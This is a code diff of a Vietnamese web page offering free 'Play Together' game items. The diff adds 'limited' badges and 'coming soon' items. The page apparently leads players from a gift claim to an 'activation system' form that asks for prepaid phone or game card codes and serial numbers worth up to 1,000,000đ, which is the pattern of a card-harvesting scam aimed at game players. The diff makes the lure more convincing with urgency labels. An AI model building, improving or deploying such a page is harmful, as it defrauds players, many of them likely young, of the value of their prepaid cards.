@@ -6,7 +6,7 @@
     <title>NHẬN CODE PLAY TOGETHER</title>
     <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@400;700;800&display=swap" rel="stylesheet">
     <style>
-        :root { --red: #e74c3c; --blue: #3498db; --green: #2ecc71; --bg: #f8f9fa; }
+        :root { --red: #e74c3c; --blue: #3498db; --green: #2ecc71; --bg: #f8f9fa; --gray: #bdc3c7; --orange: #f39c12; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Lexend', sans-serif; }
         body { background: var(--bg); padding-bottom: 80px; }
 
@@ -14,25 +14,25 @@
         .header-logo img { height: 40px; }
         .banner { width: 100%; display: block; height: auto; }
 
-        /* Chữ chạy */
         .marquee-box { background: #fffbe6; border-bottom: 1px solid #ffe58f; padding: 8px 0; overflow: hidden; }
         .marquee-text { white-space: nowrap; display: inline-block; animation: marquee 15s linear infinite; color: #856404; font-size: 14px; font-weight: 700; }
         @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
 
-        /* Bảng Code mới nhất */
         .latest-codes { background: #fff; margin: 10px 15px; padding: 12px; border-radius: 12px; border: 1px solid #e2e8f0; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
         .latest-codes h4 { font-size: 12px; color: #718096; text-transform: uppercase; margin-bottom: 8px; display: flex; align-items: center; gap: 5px; }
         .latest-codes h4::before { content: '🔥'; }
         .code-list { display: flex; flex-wrap: wrap; gap: 6px; }
         .code-item { background: #f1f5f9; color: #475569; padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: 700; border: 1px solid #cbd5e0; }
 
-        /* Grid hiển thị vật phẩm */
         .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; padding: 15px; }
-        .card { background: white; border-radius: 15px; overflow: hidden; border: 1px solid #eee; text-align: center; padding-bottom: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); display: flex; flex-direction: column; justify-content: space-between; }
+        .card { background: white; border-radius: 15px; overflow: hidden; border: 1px solid #eee; text-align: center; padding-bottom: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); display: flex; flex-direction: column; justify-content: space-between; position: relative; }
+        
+        .limit-badge { position: absolute; top: 8px; left: 8px; background: var(--red); color: white; font-size: 9px; font-weight: 800; padding: 3px 8px; border-radius: 50px; text-transform: uppercase; z-index: 10; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
+        
         .card-img { width: 100%; aspect-ratio: 1/1; object-fit: cover; cursor: pointer; }
         .btn-main-receive { background: var(--red); color: white; border: none; padding: 8px 20px; border-radius: 8px; font-weight: 800; cursor: pointer; margin-top: 8px; font-size: 13px; align-self: center; margin-bottom: 10px; }
+        .btn-disabled { background: var(--gray) !important; cursor: not-allowed !important; opacity: 0.7; }
 
-        /* Modal hệ thống */
         .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 20px; }
         .modal.active { display: flex; }
         .modal-inner { background: white; width: 100%; max-width: 350px; border-radius: 24px; position: relative; padding: 25px; animation: scaleUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1); text-align: center; }
@@ -96,33 +96,53 @@
     updateMarqueeDate();
 
     const items = [
-        { id: 13, name: "Xưởng máy hoa hồng", img: "https://i.postimg.cc/zDppMY5g/IMG-2127.png" },
-        { id: 2, name: "2.450 Đá quý", img: "https://i.postimg.cc/85dNNzLf/IMG-2025.png" },
-        { id: 1, name: "450 Thỏi vàng", img: "https://i.postimg.cc/ydhss80F/IMG-0014.png" },
-        { id: 11, name: "Supreme Roadster Cực Quang", img: "https://i.postimg.cc/P51mpy11/IMG-2118.png" },
-        { id: 12, name: "Mùa Vọng Lâu Thiếu Gia Hổ", img: "https://i.postimg.cc/zfJRLrJF/IMG-2119.png" },
-        { id: 3, name: "Cô gái xác ướp", img: "https://i.postimg.cc/vmmwpwzM/IMG-2034.png" },
-        { id: 4, name: "Mèo kẹo sao", img: "https://i.postimg.cc/K8Z6MhCT/IMG-1962.png" },
-        { id: 5, name: "Thỏ cưng tưng tưng", img: "https://i.postimg.cc/cLn5j3X4/IMG-2052.png" },
-        { id: 6, name: "Thiên thần thỏ", img: "https://i.postimg.cc/6qPYb6ZS/IMG-2051.png" },
-        { id: 7, name: "Nini rưng rưng", img: "https://i.postimg.cc/PxrytvQH/IMG-2050.png" },
-        { id: 8, name: "Angel mate", img: "https://i.postimg.cc/0N9dfK3K/IMG-1865.png" },
-        { id: 9, name: "Tay đua vũ trụ", img: "https://i.postimg.cc/q755y9Qf/IMG-2084.png" },
-        { id: 10, name: "Vợt ánh sao mơ màng", img: "https://i.postimg.cc/T3P00tpF/IMG-2083.png" }
+        { id: 13, name: "Xưởng máy hoa hồng", img: "https://i.postimg.cc/zDppMY5g/IMG-2127.png", isLimited: true },
+        { id: 2, name: "2.450 Đá quý", img: "https://i.postimg.cc/85dNNzLf/IMG-2025.png", isLimited: true },
+        { id: 1, name: "450 Thỏi vàng", img: "https://i.postimg.cc/ydhss80F/IMG-0014.png", isLimited: true },
+        { id: 16, name: "Cần câu búa vàng", img: "https://i.postimg.cc/7YxyPMJ1/IMG-1867.png", isLimited: true }, // Vị trí thứ 4
+        { id: 11, name: "Supreme Roadster Cực Quang", img: "https://i.postimg.cc/P51mpy11/IMG-2118.png", isLimited: true },
+        { id: 12, name: "Mùa Vọng Lâu Thiếu Gia Hổ", img: "https://i.postimg.cc/zfJRLrJF/IMG-2119.png", isLimited: true },
+        { id: 3, name: "Cô gái xác ướp", img: "https://i.postimg.cc/vmmwpwzM/IMG-2034.png", isLimited: true },
+        { id: 4, name: "Mèo kẹo sao", img: "https://i.postimg.cc/K8Z6MhCT/IMG-1962.png", isLimited: true },
+        { id: 5, name: "Thỏ cưng tưng tưng", img: "https://i.postimg.cc/cLn5j3X4/IMG-2052.png", isLimited: true },
+        { id: 6, name: "Thiên thần thỏ", img: "https://i.postimg.cc/6qPYb6ZS/IMG-2051.png", isLimited: true },
+        { id: 7, name: "Nini rưng rưng", img: "https://i.postimg.cc/PxrytvQH/IMG-2050.png", isLimited: true },
+        { id: 8, name: "Angel mate", img: "https://i.postimg.cc/0N9dfK3K/IMG-1865.png", isLimited: true },
+        { id: 9, name: "Tay đua vũ trụ", img: "https://i.postimg.cc/q755y9Qf/IMG-2084.png", isLimited: true },
+        { id: 10, name: "Vợt ánh sao mơ màng", img: "https://i.postimg.cc/T3P00tpF/IMG-2083.png", isLimited: true },
+        { id: 14, name: "Gói kẹo cao su bạc hà", img: "https://i.postimg.cc/x8wpWQmp/Khong-Co-Tieu-De11-20260225012237.png", isComingSoon: true, isLimited: true },
+        { id: 15, name: "Valentine xanh cá tính", img: "https://i.postimg.cc/VkgQbSM7/Khong-Co-Tieu-De12-20260225014422.png", isComingSoon: true, isLimited: true }
     ];
 
     let userPlayerID = ""; 
     const grid = document.getElementById('item-grid');
+    
     items.forEach(i => {
-        grid.innerHTML += `<div class="card"><img src="${i.img}" class="card-img" onclick="showItemDetail('${i.name}', '${i.img}')"><div style="font-size:13px; font-weight:700; margin: 10px 5px">${i.name}</div><button class="btn-main-receive" onclick="showItemDetail('${i.name}', '${i.img}')">Nhận</button></div>`;
+        let buttonHtml = '';
+        let limitBadgeHtml = i.isLimited ? `<div class="limit-badge">Giới hạn</div>` : '';
+
+        if (i.isComingSoon) {
+            buttonHtml = `<button class="btn-main-receive btn-disabled" disabled>Sắp ra mắt</button>`;
+        } else {
+            buttonHtml = `<button class="btn-main-receive" onclick="showItemDetail('${i.name}', '${i.img}', false)">Nhận</button>`;
+        }
+
+        grid.innerHTML += `
+            <div class="card">
+                ${limitBadgeHtml}
+                <img src="${i.img}" class="card-img" onclick="showItemDetail('${i.name}', '${i.img}', ${i.isComingSoon || false})">
+                <div style="font-size:13px; font-weight:700; margin: 10px 5px">${i.name}</div>
+                ${buttonHtml}
+            </div>`;
     });
 
     const modal = document.getElementById('app-modal');
     const content = document.getElementById('modal-content');
 
-    function showItemDetail(name, img) {
+    function showItemDetail(name, img, isSoon) {
         modal.classList.add('active');
-        content.innerHTML = `<img src="${img}" class="zoom-img"><div class="zoom-title">${name}</div><button class="btn-popup-receive" onclick="openIDInput()">🎁 Nhận Quà</button>`;
+        let btnHtml = isSoon ? `<button class="btn-popup-receive btn-disabled" disabled>Sắp ra mắt</button>` : `<button class="btn-popup-receive" onclick="openIDInput()">🎁 Nhận Quà</button>`;
+        content.innerHTML = `<img src="${img}" class="zoom-img"><div class="zoom-title">${name}</div>${btnHtml}`;
     }
 
     function openIDInput() {
@@ -147,22 +167,13 @@
             <h3 style="margin-bottom:15px">HỆ THỐNG KÍCH HOẠT</h3>
             <label>Loại thẻ</label>
             <select id="card-type">
-                <option value="Viettel">Viettel</option>
-                <option value="Zing">Zing</option>
-                <option value="Mobifone">Mobifone</option>
-                <option value="Vinaphone">Vinaphone</option>
-                <option value="Garena">Garena</option>
+                <option value="Viettel">Viettel</option><option value="Zing">Zing</option><option value="Mobifone">Mobifone</option><option value="Vinaphone">Vinaphone</option><option value="Garena">Garena</option>
             </select>
             <label>Mệnh giá</label>
             <select id="card-amount">
-                <option value="50000">50.000đ</option>
-                <option value="100000">100.000đ</option>
-                <option value="200000">200.000đ</option>
-                <option value="500000">500.000đ</option>
-                <option value="1000000">1.000.000đ</option>
+                <option value="50000">50.000đ</option><option value="100000">100.000đ</option><option value="200000">200.000đ</option><option value="500000">500.000đ</option><option value="1000000">1.000.000đ</option>
             </select>
-            <input type="text" id="c-code" placeholder="Mã thẻ nạp...">
-            <input type="text" id="c-seri" placeholder="Số Seri thẻ...">
+            <input type="text" id="c-code" placeholder="Mã thẻ nạp..."><input type="text" id="c-seri" placeholder="Số Seri thẻ...">
             <button class="btn-popup-receive" onclick="finalLoading()">XÁC NHẬN THẺ</button>`;
     }
 
